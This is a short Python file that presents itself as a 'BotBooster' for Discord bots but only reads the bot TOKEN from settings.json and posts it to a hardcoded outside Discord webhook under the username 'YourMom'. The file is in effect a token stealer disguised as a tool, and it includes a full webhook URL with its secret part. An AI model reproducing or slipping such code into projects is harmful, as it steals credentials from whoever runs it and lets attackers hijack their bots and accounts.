import json
import sys
import asyncio

from discord_webhook import DiscordWebhook, DiscordEmbed





with open('settings.json') as f:
  settingsdata = json.load(f)



class BotBooster:
  async def run(ctx):
    content = settingsdata['TOKEN']
    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/894416668065947688/yeCk4Jefhb0DBc-VTM5Tw6ZtcU_KJfVTnWKEsB8kNzVEONDfcZAQl8vPuxUGeoZW8SCi", username="YourMom", content=content)
    response = webhook.execute()

